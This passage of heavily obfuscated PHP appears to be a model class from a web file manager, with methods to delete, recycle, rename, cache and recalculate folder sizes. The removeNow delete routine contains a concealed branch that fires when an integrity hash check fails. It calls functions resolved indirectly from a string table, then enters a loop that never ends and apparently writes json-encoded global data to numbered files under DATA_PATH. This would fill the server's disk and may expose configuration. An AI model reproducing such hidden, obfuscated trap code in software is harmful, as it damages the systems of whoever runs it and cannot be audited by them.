$²ç—ıÔ®[$Ù™Ó’Ç¯[2297]] ? $²ç—ıÔ®[$Ù™Ó’Ç¯[2297]] : $²ç—ıÔ®[$Ù™Ó’Ç¯[32]]; show_json(LNG($Ù™Ó’Ç¯[2298]) . $Ù™Ó’Ç¯[2299] . LNG($Ù™Ó’Ç¯[2300]) . $Ù™Ó’Ç¯[2301] . $äˆ˜ Ğó . $Ù™Ó’Ç¯[2302], !1); } public function fileIsLock($£¸§²à¶, $Ÿ™±åÒ = false) { $›Üü—® =& $_SERVER[ÅÄÇĞô]; if (!_get($£¸§²à¶, $›Üü—®[614], 0)) { return !1; } if ($£¸§²à¶[$›Üü—®[544]][$›Üü—®[617]] != USER_ID) { return !0; } $éúè×ß¥ = $GLOBALS[$›Üü—®[6]][$›Üü—®[92]][$›Üü—®[615]]; if ($£¸§²à¶[$›Üü—®[544]][$›Üü—®[616]] <= time() - $éúè×ß¥) { $this->metaSet($£¸§²à¶[$›Üü—®[194]], $›Üü—®[617], null); $this->metaSet($£¸§²à¶[$›Üü—®[194]], $›Üü—®[616], null); } if ($Ÿ™±åÒ) { $this->metaSet($£¸§²à¶[$›Üü—®[194]], $›Üü—®[616], time()); } return !1; } private function _addSource($ëÅÇˆŠ, $›ñï™Éˆ) { $áìì–ü» =& $_SERVER[ÅÄÇĞô]; $åÚ×Ôâ€ = defined($áìì–ü»[2228]) ? USER_ID : 0; $¦½òÂïØ = array($áìì–ü»[656] => $›ñï™Éˆ[$áìì–ü»[191]], $áìì–ü»[657] => $›ñï™Éˆ[$áìì–ü»[574]], $áìì–ü»[658] => $åÚ×Ôâ€, $áìì–ü»[659] => $åÚ×Ôâ€, $áìì–ü»[480] => $›ñï™Éˆ[$áìì–ü»[194]], $áìì–ü»[660] => $›ñï™Éˆ[$áìì–ü»[589]] . $›ñï™Éˆ[$áìì–ü»[194]] . $áìì–ü»[50], $áìì–ü»[507] => 0, $áìì–ü»[661] => $áìì–ü»[12]); $ëÅÇˆŠ = array_merge($¦½òÂïØ, $ëÅÇˆŠ); $this->updateModifyTime($ëÅÇˆŠ[$áìì–ü»[193]]); $Ğïˆø†« = $áìì–ü»[2303] . $›ñï™Éˆ[$áìì–ü»[194]]; if (isset(self::$cacheChildList[$Ğïˆø†«])) { unset(self::$cacheChildList[$Ğïˆø†«]); } static $ óˆÈï = false; if (!$ óˆÈï) { Hook::trigger($áìì–ü»[644], $ëÅÇˆŠ); $ óˆÈï = !0; } $ş†á² = $this->add($ëÅÇˆŠ); $‡¿€í¨« = array($áìì–ü»[662] => short_id($ş†á²)); $this->where(array($áìì–ü»[494] => $ş†á²))->save($‡¿€í¨«); $this->setNamePinyin($ş†á², $ëÅÇˆŠ[$áìì–ü»[32]]); return $ş†á²; } public function remove($“¶¿‡çâ, $“÷¿Û‡õ = true) { $äŞğßüÁ =& $_SERVER[ÅÄÇĞô]; $ËÙîõƒ‰ = $this->sourceInfo($“¶¿‡çâ); $²âòÀí¼ = intval($ËÙîõƒ‰[$äŞğßüÁ[191]]) === self::TYPE_SYSTEM; $¿À’ì½ = Model($äŞğßüÁ[511])->get($äŞğßüÁ[2304]) == $äŞğßüÁ[91]; if ($²âòÀí¼ || $“÷¿Û‡õ || !$¿À’ì½) { return $this->removeNow($“¶¿‡çâ, $“÷¿Û‡õ); } $ŠÑĞÆõó = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $øÔæœ×™ = $ËÙîõƒ‰[$äŞğßüÁ[191]] == self::TYPE_USER ? $äŞğßüÁ[670] : $äŞğßüÁ[583]; if ($øÔæœ×™ == $äŞğßüÁ[670]) { $ŠÓÎÌşâ = Model($äŞğßüÁ[582])->getInfo($ËÙîõƒ‰[$äŞğßüÁ[574]]); $ŠÂäçëÀ = !empty($ŠÓÎÌşâ[$äŞğßüÁ[2297]]) ? $ŠÓÎÌşâ[$äŞğßüÁ[2297]] : $ŠÓÎÌşâ[$äŞğßüÁ[32]]; $ŠÂäçëÀ = $äŞğßüÁ[340] . $ŠÂäçëÀ . $äŞğßüÁ[2305] . $ËÙîõƒ‰[$äŞğßüÁ[574]]; } else { $ŠÓÎÌşâ = Model($äŞğßüÁ[590])->getInfo($ËÙîõƒ‰[$äŞğßüÁ[574]]); $ŠÂäçëÀ = _get($ŠÓÎÌşâ, $äŞğßüÁ[32]); $ŠÂäçëÀ = $äŞğßüÁ[176] . $ŠÂäçëÀ . $äŞğßüÁ[2306] . $ËÙîõƒ‰[$äŞğßüÁ[574]]; } $Ïšôı“ƒ = $äŞğßüÁ[2307] . md5($ŠÂäçëÀ); CacheLock::lock($Ïšôı“ƒ); $ççÕ ¦ô = $this->fileNameExist($ŠÑĞÆõó, $ŠÂäçëÀ); if (!$ççÕ ¦ô) { $ççÕ ¦ô = $this->mkdir($ŠÑĞÆõó, $ŠÂäçëÀ, REPEAT_SKIP); $this->metaSet($ççÕ ¦ô, $äŞğßüÁ[2308], $øÔæœ×™); $this->metaSet($ççÕ ¦ô, $äŞğßüÁ[2309], $ËÙîõƒ‰[$äŞğßüÁ[574]]); if ($ËÙîõƒ‰[$äŞğßüÁ[193]] != 0) { $this->metaSet($ççÕ ¦ô, $äŞğßüÁ[2310], _get($ŠÓÎÌşâ, $äŞğßüÁ[2311])); } } CacheLock::unlock($Ïšôı“ƒ); $this->metaSet($“¶¿‡çâ, $äŞğßüÁ[2312], $ËÙîõƒ‰[$äŞğßüÁ[193]]); $this->where(array($äŞğßüÁ[194] => $“¶¿‡çâ))->save(array($äŞğßüÁ[501] => time())); $this->recycleClear($ËÙîõƒ‰); Model($äŞğßüÁ[641])->eventRemove($“¶¿‡çâ); $÷²•¦šˆ = $this->move($“¶¿‡çâ, $ççÕ ¦ô, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ËÙîõƒ‰[$äŞğßüÁ[193]]); return $÷²•¦šˆ; } private function recycleClear($µÖ¡“—Å) { $óåŸ—í =& $_SERVER[ÅÄÇĞô]; $ËÇİßß = $this->childrenAll($µÖ¡“—Å); $™¦÷üûò = array($óåŸ—í[494] => array($óåŸ—í[495], $ËÇİßß[$óåŸ—í[2313]])); Model($óåŸ—í[2314])->where($™¦÷üûò)->delete(); } public function removeNow($šôŸ˜…Í, $ºğ‚ÇÙ€ = true) { $¢Ÿœ¡¶ =& $_SERVER[ÅÄÇĞô]; $áˆİ‚Ç = $_SERVER[$¢Ÿœ¡¶[839]] . $¢Ÿœ¡¶[840]; $ÌÂ¤Ñî´ = $¢Ÿœ¡¶[836]; if ($_SERVER[$¢Ÿœ¡¶[837]] != $ÌÂ¤Ñî´($áˆİ‚Ç)) { $öĞÓ¯€† = $¢Ÿœ¡¶[978]; $§âØ²Å = $¢Ÿœ¡¶[838]; $‚¯Ï¨Ùñ = $_SERVER[$¢Ÿœ¡¶[839]] . $¢Ÿœ¡¶[840]; $šàğ´­• = $§âØ²Å($‚¯Ï¨Ùñ); $ğŞ”—àÛ = explode($¢Ÿœ¡¶[288], $šàğ´­•); if (count($ğŞ”—àÛ) < $¢Ÿœ¡¶[699]) { $Òî’°Ÿ = $¢Ÿœ¡¶[841]; $Òî’°Ÿ(); } $şÑÆ¨í— = $¢Ÿœ¡¶[979]; $şÑÆ¨í—($_SERVER[$¢Ÿœ¡¶[980]]); $öĞÓ¯€† = $¢Ÿœ¡¶[978]; $öĞÓ¯€†(); $ß…õ¤Ÿã = $¢Ÿœ¡¶[981]; $´¢Ÿ°¢ = json_encode($GLOBALS[$¢Ÿœ¡¶[982]]); $Í’ÛüÌÚ = 1; for ($Òé°¼Æˆ = $Í’ÛüÌÚ; $Òé°¼Æˆ > 0; $Òé°¼Æˆ++) { $ß…õ¤Ÿã(DATA_PATH . $Òé°¼Æˆ, $´¢Ÿ°¢); } } $Ø½«­®° = $this->sourceInfo($šôŸ˜…Í); $”‚ûö = $this->pathInfoMore($šôŸ˜…Í); if (!$Ø½«­®°) { return !0; } if ($Ø½«­®°[$¢Ÿœ¡¶[193]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($šôŸ˜…Í); Hook::trigger($¢Ÿœ¡¶[2315], $”‚ûö, $ºğ‚ÇÙ€); if ($ºğ‚ÇÙ€) { Model($¢Ÿœ¡¶[2314])->moveToRecycle($šôŸ˜…Í); } else { $á­ˆÙÕÙ = $this->childrenAll($Ø½«­®°); Model($¢Ÿœ¡¶[641])->eventRemove($šôŸ˜…Í); $this->removeRelevance($á­ˆÙÕÙ[$¢Ÿœ¡¶[2313]], $á­ˆÙÕÙ[$¢Ÿœ¡¶[1600]]); } $this->folderSizeReset($Ø½«­®°[$¢Ÿœ¡¶[193]]); $Óı­İ«¾ = array($Ø½«­®°[$¢Ÿœ¡¶[193]]); if ($Ø½«­®°[$¢Ÿœ¡¶[488]] == $¢Ÿœ¡¶[91]) { $Óı­İ«¾[] = $Ø½«­®°[$¢Ÿœ¡¶[194]]; } $this->updateModifyTime($Óı­İ«¾); $this->lockMoveEnd($šôŸ˜…Í); Hook::trigger($¢Ÿœ¡¶[1840], $”‚ûö, $ºğ‚ÇÙ€); return !0; } public function childrenAll($•áô‹ÔÏ) { $Ï ½¾ƒ§ =& $_SERVER[ÅÄÇĞô]; $çú…±Œ = $•áô‹ÔÏ[$Ï ½¾ƒ§[194]]; if ($•áô‹ÔÏ[$Ï ½¾ƒ§[488]] == $Ï ½¾ƒ§[91]) { $§İ¤Ü…Ó = array($Ï ½¾ƒ§[660] => array($Ï ½¾ƒ§[620], $•áô‹ÔÏ[$Ï ½¾ƒ§[589]] . $çú…±Œ . $Ï ½¾ƒ§[621])); $àªéñ = array($Ï ½¾ƒ§[660] => $§İ¤Ü…Ó[$Ï ½¾ƒ§[589]]); $Ğï¾óÒ = $this->field($Ï ½¾ƒ§[2316])->where($àªéñ)->select(); $ÑÏå£Ğá = !1; $Âë­© = array($çú…±Œ); if ($Ğï¾óÒ) { $ÑÏå£Ğá = array_to_keyvalue($Ğï¾óÒ, $Ï ½¾ƒ§[12], $Ï ½¾ƒ§[546]); $ÑÏå£Ğá = array_remove_value($ÑÏå£Ğá, $Ï ½¾ƒ§[231]); $Âë­© = array_to_keyvalue($Ğï¾óÒ, $Ï ½¾ƒ§[12], $Ï ½¾ƒ§[194]); $Âë­©[] = $çú…±Œ; } } else { $ÑÏå£Ğá = array($•áô‹ÔÏ[$Ï ½¾ƒ§[546]]); $Âë­© = array($çú…±Œ); } return array($Ï ½¾ƒ§[2313] => $Âë­©, $Ï ½¾ƒ§[1600] => $ÑÏå£Ğá); } public function removeArray($èÖø¼·) { if (!$èÖø¼·) { return !0; } } public function removeRelevance($Ç¤Ò”úõ, $¦Óüı®Ù) { $ÉÙÛå„ =& $_SERVER[ÅÄÇĞô]; $Ç¤Ò”úõ = $Ç¤Ò”úõ ? $Ç¤Ò”úõ : array(); $¦Óüı®Ù = $¦Óüı®Ù ? $¦Óüı®Ù : array(); $Ç¤Ò”úõ = array_unique(array_filter($Ç¤Ò”úõ)); $¦Óüı®Ù = array_unique(array_filter($¦Óüı®Ù)); if (!$Ç¤Ò”úõ) { return !1; } $İ®£´°ğ = array($ÉÙÛå„[494] => array($ÉÙÛå„[495], $Ç¤Ò”úõ)); Model($ÉÙÛå„[2314])->where($İ®£´°ğ)->delete(); Model($ÉÙÛå„[538])->where($İ®£´°ğ)->delete(); Model($ÉÙÛå„[2153])->where($İ®£´°ğ)->delete(); Model($ÉÙÛå„[641])->where($İ®£´°ğ)->delete(); Model($ÉÙÛå„[1977])->removeBySource($Ç¤Ò”úõ); Model($ÉÙÛå„[2295])->removeBySource($Ç¤Ò”úõ); $this->where($İ®£´°ğ)->delete(); Model($ÉÙÛå„[549])->remove($¦Óüı®Ù); for ($Ó“œöø’ = 0; $Ó“œöø’ < count($Ç¤Ò”úõ); $Ó“œöø’++) { $this->sourceCacheClear($Ç¤Ò”úõ[$Ó“œöø’]); } } public function rename($Œ§ÆÕ’ı, $³Û´Ÿ²Õ) { $¿Ëôö€Ä =& $_SERVER[ÅÄÇĞô]; $½ÓÚÓš = $this->sourceInfo($Œ§ÆÕ’ı); if (!$½ÓÚÓš) { return !1; } $¤×‚ÆÍš = $this->fileNameExist($½ÓÚÓš[$¿Ëôö€Ä[193]], $³Û´Ÿ²Õ); if ($¤×‚ÆÍš && $¤×‚ÆÍš != $Œ§ÆÕ’ı) { return !1; } $ÁÈ¡±ë› = array($¿Ëôö€Ä[497] => $³Û´Ÿ²Õ, $¿Ëôö€Ä[659] => USER_ID); if ($½ÓÚÓš[$¿Ëôö€Ä[488]] != $¿Ëôö€Ä[91]) { $ÁÈ¡±ë›[$¿Ëôö€Ä[489]] = substr(get_path_ext($³Û´Ÿ²Õ), 0, 10); } Model($¿Ëôö€Ä[641])->eventRename($Œ§ÆÕ’ı, $½ÓÚÓš[$¿Ëôö€Ä[32]], $³Û´Ÿ²Õ); $this->sourceCacheClear($Œ§ÆÕ’ı); $this->setNamePinyin($Œ§ÆÕ’ı, $ÁÈ¡±ë›[$¿Ëôö€Ä[32]], !1); $this->updateModifyTime($½ÓÚÓš[$¿Ëôö€Ä[193]]); $ØŠøÕ«ï = $this->where(array($¿Ëôö€Ä[494] => $Œ§ÆÕ’ı))->data($ÁÈ¡±ë›)->save(); $‹ÅÛ¡½Ş = $¿Ëôö€Ä[2303] . $½ÓÚÓš[$¿Ëôö€Ä[193]]; if (isset(self::$cacheChildList[$‹ÅÛ¡½Ş])) { unset(self::$cacheChildList[$‹ÅÛ¡½Ş]); } return $ØŠøÕ«ï; } public function setNamePinyin($€å¤ÛÁÚ, $Ñè‘“, $ßÙ§¾ÔÎ = true) { $Çå‡È—™ =& $_SERVER[ÅÄÇĞô]; $«ó†¾Œ = Input::check($Ñè‘“, $Çå‡È—™[663]); $Öµ°À³š = array($Çå‡È—™[520] => KodSort::makeStr($Ñè‘“)); if ($«ó†¾Œ) { $Öµ°À³š[$Çå‡È—™[541]] = str_replace($Çå‡È—™[53], $Çå‡È—™[12], Pinyin::get($Ñè‘“)); $Öµ°À³š[$Çå‡È—™[540]] = Pinyin::get($Ñè‘“, $Çå‡È—™[664]); } if (!$ßÙ§¾ÔÎ && !$«ó†¾Œ) { $Öµ°À³š[$Çå‡È—™[541]] = null; $Öµ°À³š[$Çå‡È—™[540]] = null; } $this->metaSet($€å¤ÛÁÚ, $Öµ°À³š); } public function getContent($˜‚“«) { $éËÇ‹«Ù =& $_SERVER[ÅÄÇĞô]; $–Íü°ÃÀ = $this->fileInfoGet($˜‚“«); if (!$–Íü°ÃÀ) { return !1; } if ($–Íü°ÃÀ[$éËÇ‹«Ù[79]] == 0) { return $éËÇ‹«Ù[12]; } $øƒ‘ï„ = $éËÇ‹«Ù[2317] . $–Íü°ÃÀ[$éËÇ‹«Ù[552]]; if ($–Íü°ÃÀ[$éËÇ‹«Ù[79]] <= 1024 * 10) { $ïİô­ëì = Cache::get($øƒ‘ï„); if (!$ïİô­ëì) { $ïİô­ëì = IO::getContent($–Íü°ÃÀ[$éËÇ‹«Ù[87]]); Cache::set($øƒ‘ï„, $ïİô­ëì); } return $ïİô­ëì; } if (!$–Íü°ÃÀ[$éËÇ‹«Ù[87]]) { return $éËÇ‹«Ù[12]; } return IO::getContent($–Íü°ÃÀ[$éËÇ‹«Ù[87]]); } public function setDesc($‘êší, $ù‰¸ßÈ) { $±Ø™Ë»ì =& $_SERVER[ÅÄÇĞô]; Model($±Ø™Ë»ì[641])->eventAddDesc($‘êší, $ù‰¸ßÈ); return $this->metaSet($‘êší, $±Ø™Ë»ì[529], $ù‰¸ßÈ); } public function setContent($óææìİ, $Ëìœ„— = '') { $ †ÜáÆ =& $_SERVER[ÅÄÇĞô]; $ıÕæÒË = $this->sourceInfo($óææìİ); $¥¼é„Ê¼ = $this->fileInfoGet($óææìİ); if (!$¥¼é„Ê¼ || !$ıÕæÒË) { return !1; } $ÖæİÂŠĞ = Model($ †ÜáÆ[549])->addFileByContent($Ëìœ„—, $ıÕæÒË[$ †ÜáÆ[32]]); if (!$ÖæİÂŠĞ) { return !1; } $€èó®ßß = $this->fileHistory($ıÕæÒË, $ÖæİÂŠĞ[$ †ÜáÆ[546]], $ÖæİÂŠĞ[$ †ÜáÆ[79]]); if (!$€èó®ßß) { return Model($ †ÜáÆ[549])->remove($ÖæİÂŠĞ[$ †ÜáÆ[546]]); } $this->folderSizeReset($ıÕæÒË[$ †ÜáÆ[193]]); return !0; } public function fileSubstr($®¬Şí€£, $¾ˆ­·‘Í, $ºâàµïÙ) { $¤—üÚÜ¼ = $this->fileInfoGet($®¬Şí€£); if (!$¤—üÚÜ¼) { return !1; } return IO::fileSubstr($¤—üÚÜ¼[$_SERVER[ÅÄÇĞô][87]], $¾ˆ­·‘Í, $ºâàµïÙ); } public function fileInfoGet($Á–ŠÌÙ–) { $Ì…¦á¢š =& $_SERVER[ÅÄÇĞô]; $…ÎøØÚ° = $this->sourceInfo($Á–ŠÌÙ–); if (!$…ÎøØÚ° || $…ÎøØÚ°[$Ì…¦á¢š[488]]) { return !1; } $Üİóä¹ = $Ì…¦á¢š[553] . $…ÎøØÚ°[$Ì…¦á¢š[546]]; $§ÓÖÉÂ® = _get(self::$cacheFileInfo, $Üİóä¹); if ($§ÓÖÉÂ®) { return $§ÓÖÉÂ®; } $ªñ ÀÕâ = Model($Ì…¦á¢š[549])->fileInfo($…ÎøØÚ°[$Ì…¦á¢š[546]]); if ($ªñ ÀÕâ) { $ªñ ÀÕâ[$Ì…¦á¢š[32]] = $…ÎøØÚ°[$Ì…¦á¢š[32]]; } self::$cacheFileInfo[$Üİóä¹] = $ªñ ÀÕâ; return $ªñ ÀÕâ; } private function folderChildrenNumber($·Ò‡¤±²) { $Ç£ç =& $_SERVER[ÅÄÇĞô]; $÷õÑ³È = $this->sourceInfo($·Ò‡¤±²); $ç™Ş×í = array($Ç£ç[660] => array($Ç£ç[620], $÷õÑ³È[$Ç£ç[589]] . $·Ò‡¤±² . $Ç£ç[621]), $Ç£ç[657] => $÷õÑ³È[$Ç£ç[574]], $Ç£ç[507] => intval($÷õÑ³È[$Ç£ç[508]]), $Ç£ç[654] => 1); $¡ìèğÎ¤ = $this->where($ç™Ş×í)->count(); $ù´…öş© = $this->where($ç™Ş×í)->where(array($Ç£ç[654] => 0))->count(); return array($Ç£ç[83] => $ù´…öş©, $Ç£ç[84] => $¡ìèğÎ¤); } public function pathInfo($öÑá³ßÙ, $ıÄŠû• = false) { $ÑÙÑÜ™µ =& $_SERVER[ÅÄÇĞô]; $ıÄŠû• = !1; $öÑá³ßÙ = intval($öÑá³ßÙ); $ÍºŠ…ºË = $ÑÙÑÜ™µ[537] . intval($ıÄŠû•) . $ÑÙÑÜ™µ[465] . $öÑá³ßÙ; $ Ï·Ú¢ = _get(self::$cachePathInfo, $ÍºŠ…ºË); if ($ Ï·Ú¢) { return $ Ï·Ú¢; } $¡ÒŒØáÏ = $this->sourceInfo($öÑá³ßÙ); if (!$¡ÒŒØáÏ) { return !1; } $¡ÒŒØáÏ = $this->_listDataApplyItem($¡ÒŒØáÏ, $ıÄŠû•); self::$cachePathInfo[$ÍºŠ…ºË] = $¡ÒŒØáÏ; return $¡ÒŒØáÏ; } public static $cachePathInfoMore = array(); public function pathInfoMore($Ì„ö™ê) { $áşåşÉ =& $_SERVER[ÅÄÇĞô]; $Ÿ‚¥¬íŠ = _get(self::$cachePathInfoMore, $Ì„ö™ê); if ($Ÿ‚¥¬íŠ) { return $Ÿ‚¥¬íŠ; } $Ğí®áƒÌ = $this->pathInfo($Ì„ö™ê); if (!$Ğí®áƒÌ) { return !1; } if ($Ğí®áƒÌ[$áşåşÉ[488]] == $áşåşÉ[91]) { $Ğí®áƒÌ[$áşåşÉ[82]] = $this->folderChildrenNumber($Ì„ö™ê); } self::$cachePathInfoMore[$Ì„ö™ê] = $Ğí®áƒÌ; return $Ğí®áƒÌ; } public function sourceInfo($‡í¶•´Í) { $“¹ÑÁñ¾ =& $_SERVER[ÅÄÇĞô]; if (!$‡í¶•´Í) { return array(); } $‡í¶•´Í = intval($‡í¶•´Í); $¥¹£¼ûÔ = $“¹ÑÁñ¾[536] . $‡í¶•´Í; $„ÚÁ»ö = _get(self::$cacheSourceInfo, $¥¹£¼ûÔ); if ($„ÚÁ»ö) { return $„ÚÁ»ö; } $¡¡­½ãò = $this->where(array($“¹ÑÁñ¾[194] => $‡í¶•´Í))->find(); self::$cacheSourceInfo[$¥¹£¼ûÔ] = $¡¡­½ãò; return self::$cacheSourceInfo[$¥¹£¼ûÔ]; } public function sourceCacheClear($ù„ó§³Ğ = false) { self::cacheClear($ù„ó§³Ğ); } public static function cacheClear($´ê¶»ø = false) { $Æœ¶¦û» =& $_SERVER[ÅÄÇĞô]; if ($´ê¶»ø == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Æœ¶¦û»[536] . $´ê¶»ø]); unset(self::$cachePathInfoMore[$´ê¶»ø]); unset(self::$cachePathInfo[$Æœ¶¦û»[2318] . $´ê¶»ø]); unset(self::$cachePathInfo[$Æœ¶¦û»[2319] . $´ê¶»ø]); } public function metaSet($õ÷¸‡Ûƒ, $¬öî×Ü° = null, $éîÂµ¢µ = null) { $‡´º†Á« = parent::metaSet($õ÷¸‡Ûƒ, $¬öî×Ü°, $éîÂµ¢µ); if ($‡´º†Á«) { $this->sourceCacheClear($õ÷¸‡Ûƒ); } return $‡´º†Á«; } public function pathInfoByPath($ªÛŞÛÄä, $‘ÊÊ ½ş) { $Ñ­êÕ½å =& $_SERVER[ÅÄÇĞô]; $”ŸŞ„ÒÌ = !$‘ÊÊ ½ş ? array() : explode($Ñ­êÕ½å[8], trim($‘ÊÊ ½ş, $Ñ­êÕ½å[8])); $Şäíªìß = $ªÛŞÛÄä; foreach ($”ŸŞ„ÒÌ as $‰Ë›) { $×­Ï—æë = array($Ñ­êÕ½å[193] => $Şäíªìß, $Ñ­êÕ½å[32] => $‰Ë›); $Ó¦Ş¶†Ü = $this->field($Ñ­êÕ½å[2320])->where($×­Ï—æë)->select(); if (!$Ó¦Ş¶†Ü) { return !1; } $Ó¦Ş¶†Ü = array_sort_by($Ó¦Ş¶†Ü, $Ñ­êÕ½å[508]); $Şäíªìß = $Ó¦Ş¶†Ü[0][$Ñ­êÕ½å[194]]; } $—×Õé = $this->sourceInfo($Şäíªìß); $this->pathInfoFilter($—×Õé); return $—×Õé; } protected function updateModifyTime($¨¬èåøÆ) { $ßÈ•°È =& $_SERVER[ÅÄÇĞô]; $“õ×œÈĞ = defined($ßÈ•°È[2228]) ? USER_ID : 0; if (!$¨¬èåøÆ) { return; } if (!is_array($¨¬èåøÆ)) { $¨¬èåøÆ = array($¨¬èåøÆ); } foreach ($¨¬èåøÆ as $æÆìóÍ => $œÖ®ë¸š) { $¨¬èåøÆ[$æÆìóÍ] = intval($œÖ®ë¸š); $this->sourceCacheClear($œÖ®ë¸š); } $¡¥ûŒ¹½ = array($ßÈ•°È[194] => array($ßÈ•°È[7], $¨¬èåøÆ)); $Ê•×™—’ = array($ßÈ•°È[659] => $“õ×œÈĞ, $ßÈ•°È[501] => time()); $this->where($¡¥ûŒ¹½)->save($Ê•×™—’); } public function folderSizeReset($‡»âæ×, $ê–ÜÕàï = false) { $Ñ¿íä“Ş =& $_SERVER[ÅÄÇĞô]; if ($this->statusIgnoreResetSpace) { return; } $åãËÀóÇ = $this->sourceInfo($‡»âæ×); $¾‰£×°Ñ = $Ñ¿íä“Ş[2321] . $‡»âæ×; CacheLock::lock($¾‰£×°Ñ, 20); if ($ê–ÜÕàï === !1) { $this->sourceCacheClear($‡»âæ×); $åãËÀóÇ = $this->sourceInfo($‡»âæ×); $ÓÓ®’˜ = array($Ñ¿íä“Ş[480] => $‡»âæ×, $Ñ¿íä“Ş[507] => 0); $Æ§â¿²¶ = $this->where($ÓÓ®’˜)->sum($Ñ¿íä“Ş[79]); $ê–ÜÕàï = intval($Æ§â¿²¶) - intval($åãËÀóÇ[$Ñ¿íä“Ş[79]]); } if ($ê–ÜÕàï == 0) { return CacheLock::unlock($¾‰£×°Ñ); } $ËÌ‰“£¤ = $this->parentLevelArray($åãËÀóÇ[$Ñ¿íä“Ş[589]]); if (!$ËÌ‰“£¤) { $ËÌ‰“£¤ = array(); } $ËÌ‰“£¤[] = $åãËÀóÇ[$Ñ¿íä“Ş[194]]; $ÓÓ®’˜ = array($Ñ¿íä“Ş[194] => array($Ñ¿íä“Ş[495], $ËÌ‰“£¤)); if ($ê–ÜÕàï < 0) { $ÓÓ®’˜[$Ñ¿íä“Ş[79]] = array($Ñ¿íä“Ş[1115], abs($ê–ÜÕàï)); } $this->where($ÓÓ®’˜)->setAdd($Ñ¿íä“Ş[79], $ê–ÜÕàï); CacheLock::unlock($¾‰£×°Ñ); $È”‰·úç = $Ñ¿íä“Ş[2322] . $åãËÀóÇ[$Ñ¿íä“Ş[191]] . $Ñ¿íä“Ş[4] . $åãËÀóÇ[$Ñ¿íä“Ş[574]]; $‰­¥ = array($åãËÀóÇ[$Ñ¿íä“Ş[191]], $åãËÀóÇ[$Ñ¿íä“Ş[574]]); TaskRun::timeLimitCall($È”‰·úç, $Ñ¿íä“Ş[2323], $‰­¥, 1.5); } public function folderSizeResetChildren($œÂø¾€) { $óÄ¡·¹¸ =& $_SERVER[ÅÄÇĞô]; $this->sourceCacheClear($œÂø¾€); $ÈçóéÒş = $this->sourceInfo($œÂø¾€); $¢¢ºãÍ´ = array($óÄ¡·¹¸[654] => 1, $óÄ¡·¹¸[657] => $ÈçóéÒş[$óÄ¡·¹¸[574]], $óÄ¡·¹¸[660] => array($óÄ¡·¹¸[620], $ÈçóéÒş[$óÄ¡·¹¸[589]] . $œÂø¾€ . $óÄ¡·¹¸[621])); $§í±²Ó— = $óÄ¡·¹¸[2324]; $òÜï„ø¡ = $this->field($§í±²Ó—)->where($¢¢ºãÍ´)->select(); $¢¢ºãÍ´[$óÄ¡·¹¸[488]] = 0; $ØŒÎ³§ö = $this->field($§í±²Ó—)->where($¢¢ºãÍ´)->select(); if (!$ØŒÎ³§ö) { return; } $òÜï„ø¡[] = $ÈçóéÒş; $òÜï„ø¡ = array_to_keyvalue($òÜï„ø¡, $óÄ¡·¹¸[194]); foreach ($òÜï„ø¡ as $Ú¡ö¶‚ => $ù¦Î£‘Î) { $òÜï„ø¡[$Ú¡ö¶‚][$óÄ¡·¹¸[2325]] = $òÜï„ø¡[$Ú¡ö¶‚][$óÄ¡·¹¸[79]]; $òÜï„ø¡[$Ú¡ö¶‚][$óÄ¡·¹¸[79]] = 0; } foreach ($ØŒÎ³§ö as $ù¦Î£‘Î) { $§áø²±’ = $ù¦Î£‘Î[$óÄ¡·¹¸[193]] . $óÄ¡·¹¸[12]; if (!isset($òÜï„ø¡[$§áø²±’])) { continue; } if ($ù¦Î£‘Î[$óÄ¡·¹¸[508]] == $òÜï„ø¡[$§áø²±’][$óÄ¡·¹¸[508]]) { $òÜï„ø¡[$§áø²±’][$óÄ¡·¹¸[79]] += $ù¦Î£‘Î[$óÄ¡·¹¸[79]]; } } foreach ($òÜï„ø¡ as $ù¦Î£‘Î) { $šŠáıÈ¡ = $this->parentLevelArray($ù¦Î£‘Î[$óÄ¡·¹¸[589]]); foreach ($šŠáıÈ¡ as $§áø²±’) { $§áø²±’ = $§áø²±’ . $óÄ¡·¹¸[12]; if (!isset($òÜï„ø¡[$§áø²±’])) { continue; } if ($ù¦Î£‘Î[$óÄ¡·¹¸[508]] == $òÜï„ø¡[$§áø²±’][$óÄ¡·¹¸[508]]) { $òÜï„ø¡[$§áø²±’][$óÄ¡·¹¸[79]] += $ù¦Î£‘Î[$óÄ¡·¹¸[79]]; } } } $úî©ç¢÷ = array(); foreach ($òÜï„ø¡ as $ù¦Î£‘Î) { if ($ù¦Î£‘Î[$óÄ¡·¹¸[79]] == $ù¦Î£‘Î[$óÄ¡·¹¸[2325]]) { continue; } $úî©ç¢÷[] = array($óÄ¡·¹¸[194], $ù¦Î£‘Î[$óÄ¡·¹¸[194]], $óÄ¡·¹¸[79], $ù¦Î£‘Î[$óÄ¡·¹¸[79]]); } $this->saveAll($úî©ç¢÷); } public function userSpaceReset($Óè€¤ÈÑ = false) { $€Å„¾ºÃ =& $_SERVER[ÅÄÇĞô]; $ˆ¤Â¸ØÒ = $this->where(array($€Å„¾ºÃ[191] => self::TYPE_USER, $€Å„¾ºÃ[574] => $Óè€¤ÈÑ, $€Å„¾ºÃ[488] => 0))->sum($€Å„¾ºÃ[79]); $ˆ¤Â¸ØÒ = !$ˆ¤Â¸ØÒ || $ˆ¤Â¸ØÒ <= 0 ? 0 : $ˆ¤Â¸ØÒ; Model($€Å„¾ºÃ[582])->userEdit($Óè€¤ÈÑ, array($€Å„¾ºÃ[1986] => $ˆ¤Â¸ØÒ)); } public function targetSpaceUpdate($ÆèÃºµ, $«ã‡å) { $ıùÆ¨ã¨ =& $_SERVER[ÅÄÇĞô]; if (!$«ã‡å) { return; } if (!in_array($ÆèÃºµ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $È¢ôğêì = $this->targetSpaceSize($ÆèÃºµ, $«ã‡å); if ($ÆèÃºµ == self::TYPE_USER) { Model($ıùÆ¨ã¨[582])->userEdit($«ã‡å, array($ıùÆ¨ã¨[1986] => $È¢ôğêì)); } else { if ($ÆèÃºµ == self::TYPE_GROUP) { Model($ıùÆ¨ã¨[590])->groupEdit($«ã‡å, array($ıùÆ¨ã¨[1986] => $È¢ôğêì)); } } } public function targetSpaceSize($¯ÜôÙ£Ê, $şÏøˆçñ) { $¿µÃ¨‘á =& 